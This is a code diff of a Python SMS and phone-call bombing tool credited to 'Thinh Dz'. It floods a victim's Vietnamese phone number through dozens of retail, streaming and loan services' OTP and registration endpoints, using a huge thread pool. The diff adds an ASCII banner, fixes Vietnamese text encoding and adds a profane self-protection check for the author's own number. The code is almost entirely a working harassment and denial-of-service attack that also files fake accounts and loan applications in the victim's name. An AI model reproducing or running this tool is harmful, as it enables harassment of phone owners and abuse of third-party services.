@@ -1,50 +1,45 @@
-import requests
 import os
 import requests,os,time,re,json,uuid,random,sys
-import socket
 from concurrent.futures import ThreadPoolExecutor
+ban = """
+\033[1;34m╔═══════════════════════════════════════════════════════════╗
+  _______ _    _ _____ _   _ _    _ 
+ |__   __| |  | |_   _| \ | | |  | |
+    | |  | |__| | | | |  \| | |__| |
+    | |  |  __  | | | | . ` |  __  |
+    | |  | |  | |_| |_| |\  | |  | |
+    |_|  |_|  |_|_____|_| \_|_|  |_| 
 
-class style():
-    BLACK = '\033[30m'
-    RED = '\033[31m'
-    GREEN = '\033[32m'
-    YELLOW = '\033[33m'
-    BLUE = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN = '\033[36m'
-    WHITE = '\033[37m'
-    UNDERLINE = '\033[4m'
-    RESET = '\033[0m'
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = "\033[1m"
-    TAU = "\U0001f680"
+\033[1;34m╠═══════════════════════════════════════════════════════════╣
+\033[1;32m║➢ Author   : Thinh Dz                                                                              
+\033[1;36m║➢ Tiktok  : https://www.tiktok.com/@merciless_king                      
+\033[1;31m║➣ Version  : V1.0                                                                            
+\033[1;33m║➣ Facebook   : Nguyễn Thịnh                                                                
+\033[1;34m╚═══════════════════════════════════════════════════════════╝
+  Lưu Ý:
+  • Động não trước khi sử dụng!!
+  • Để dừng tấn công bấm [ CTRL + z ]
+  • Khi chạy tool máy sẽ có cảm giác lag !!!
+  • Thắc mắc hoặc cần hỗ trợ liên hệ : Thinh Dz
+\033[1;31m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-ban = ""
+"""
 def banner():
-  os.system("cls")
+  os.system("clear")
   for h in ban:
     sys.stdout.write(h)
     sys.stdout.flush()
     time.sleep(0.0003)   
 banner()
-os.system("clear") 
-print(style.BLACK+"Thinh Dz")
 amount = 5000
-th='- - - - - - - - - - - - - - - - - - - - - - - - -'
-print(style.RED+'Tool By Thinh Dz ')
-print(style.BLUE+'---------------------------------------')
-sdt = input(style.GREEN+"Nh?p Sdt vào d? spam : ")
-print(style.BLUE+'---------------------------------------')
+sdt = input("[ + ] Nhập Số Điện Thoại Bỏ Vô Đây: ")
 while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
-  print(style.GREEN+"Sai d?nh d?ng !!")
-  sdt = input(style.GREEN+"Nh?p Sdt d? spam : ")
-count = int(input(style.GREEN+"Th?i gian t?n công : "))
-
+  print("⚜ Sai Định Dạng !!")
+  sdt = int(input("[ + ] Nhập Số Điện Thoại Muốn Spam : "))
+count = int(input("[ + ] Thời Gian Gửi [1=1phút ]: "))
+if sdt == "0826363378":
+  print("SPAM CÁI LỒN ĐỊT MẸ MÀY À SPAM LỘN NGƯỜI RỒI ")
+  exit()
 
 threading = ThreadPoolExecutor(max_workers=int(100000))  
 def vayvnd(sdt):
@@ -148,10 +143,10 @@ def kiot(phone):
         'code': 'bancainayne',
         'name': 'Cai Nit',
         'email': 'ahihi123982@gmail.com',
-        'zone': 'An Giang - Huy?n Châu Phú',
+        'zone': 'An Giang - Huyện Châu Phú',
         'merchant': 'bancainayne',
         'username': '0972936627',
-        'industry': 'Ði?n tho?i & Ði?n máy',
+        'industry': 'Điện thoại & Điện máy',
         'ref_code': '',
         'industry_id': '65',
         'phone_input': "0338607465",
@@ -228,7 +223,7 @@ def tv360(sdt):
   data = data.replace("sdt",sdt)
   rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
   '''if not rq["errorCode"] == 200:
-    print("L?i 360tv")'''
+    print("Lỗi 360tv")'''
 
 def winmart(sdt):
   head = {
@@ -714,7 +709,7 @@ def vietid(phone):
 def ahamove(phone):
     mail = random_string(6)
     Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
-    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tu?n","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
+    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
     Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
 
 def vieon1(phone):
@@ -935,7 +930,7 @@ def KILO(sdt):
         "accept-encoding": "gzip, deflate, br",
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
     }
-    email = random.choice(['a', 'b', 'c', 'd', 'e', 'f']) + "@gmail.com"  # Email dang ký tài kho?n
+    email = random.choice(['a', 'b', 'c', 'd', 'e', 'f']) + "@gmail.com"  # Email đăng ký tài khoản
     data = json.dumps({"phone": sdt, "email": email})
     response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)
 
@@ -994,7 +989,7 @@ def PHUCLONG(sdt):
   
     data = {
         "phoneNumber": sdt,
-        "fullName": "Nguy?n Ð?ng Hoàng H?i",
+        "fullName": "Nguyễn Đặng Hoàng Hải",
         "email": "vexnolove03@gmail.com",
         "password": "Vrxx#1337"
     }
@@ -1269,7 +1264,7 @@ def VAYSIEUDE(sdt):
     data = {
         "_token": token,
         "loan[loan_amount]": "20000000",
-        "loan[full_name]": "Không bi?t",
+        "loan[full_name]": "Không biết",
         "loan[identity]": "123456789",
         "loan[phone]": sdt
     }
@@ -1395,7 +1390,7 @@ def AHAMOVE(sdt):
     mail = ''.join(random.choices(string.asciilowercase + string.digits, k=6)) + '@gmail.com'
     data = {
         'mobile': sdt,
-        'name': 'Tu?n',
+        'name': 'Tuấn',
         'email': mail,
         'countrycode': 'VN',
         'firebasesmsauth': True
@@ -1547,7 +1542,7 @@ def DONGPLUS(sdt):
     "origin: https://dongplus.vn",
     "referer: https://dongplusvn/user/login"
   ]
-  data = '{"full_name":"Khang Nguy?n","first_name":"Nguy?n","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
+  data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
   CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
   data = '{"phone":"84' + sdt + '"}'
   access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", data, head, False)
@@ -2007,7 +2002,7 @@ def PHUCLONG(sdt):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
     }
     
-    data = {'phoneNumber': sdt, 'fullName': 'Nguy?n Ð?ng Hoàng H?i', 'email': 'vexnolove03@gmail.com', 'password': 'Vrxx#1337'}
+    data = {'phoneNumber': sdt, 'fullName': 'Nguyễn Đặng Hoàng Hải', 'email': 'vexnolove03@gmail.com', 'password': 'Vrxx#1337'}
     datason = json.dumps(data)
     response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, data=datason)
 
@@ -2174,7 +2169,7 @@ def VAYSIEUDE(sdt):
     data = {
         "_token": token,
         "loan[loan_amount]": "20000000",
-        "loan[full_name]": "Không bi?t",
+        "loan[full_name]": "Không biết",
         "loan[identity]": "123456789",
         "loan[phone]": sdt
     }
@@ -2196,7 +2191,7 @@ def AHAMOVE(sdt):
     mail = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6)) + '@gmail.com'
     data = {
         'mobile': sdt,
-        'name': 'Tu?n',
+        'name': 'Tuấn',
         'email': mail,
         'country_code': 'VN',
         'firebase_sms_auth': True
@@ -2417,7 +2412,7 @@ def DONGPLUS(sdt):
         "referer: https://dongplusvn/user/login"
     ]
     
-    data = '{"full_name":"Khang Nguy?n","first_name":"Nguy?n","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
+    data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
     
     CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
     
@@ -2699,7 +2694,7 @@ def vieon1(phone):
 def ahamove(phone):
     mail = random_string(6)
     Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
-    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tu?n","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
+    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
     Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
 ###
 
@@ -3321,7 +3316,7 @@ def KILO(sdt):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
     }
     
-    email = randomstring(6) + "@gmail.com"
+    email = randomstring(6) + "@gmail.com" # Email đăng ký tài khoản
     data = json.dumps({"phone": sdt, "email": email})
     
     response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)
@@ -3504,11 +3499,12 @@ def run(sdt,i):
   threading.submit(spamcall,sdt)
   threading.submit(KILO,sdt)
   threading.submit(GAPO,sdt) 
-  print(style.BLUE+'---------------------------------------')
-  print(style.RED+"| SMS & CALL V3| STATUS: THÀNH CÔNG |",)  
-  print(style.BLUE+'---------------------------------------')
+  print("[ Thinh Dz ] Spam SMS - Call | Delay : 5 | Thành Công ",)  
   for j in range(0, 5):
-    print(f"ÐANG GÔM LÚA",end="\r")
-    
+    # code trong vòng lặp
+    print(f"[ Thinh Dz ] | LOADING \r",end="")
+    # code by AwmxBaby
 for i in range(1,count+1):
   run(sdt,i)
+ 
+# Coppyright AwmxBaby Software 
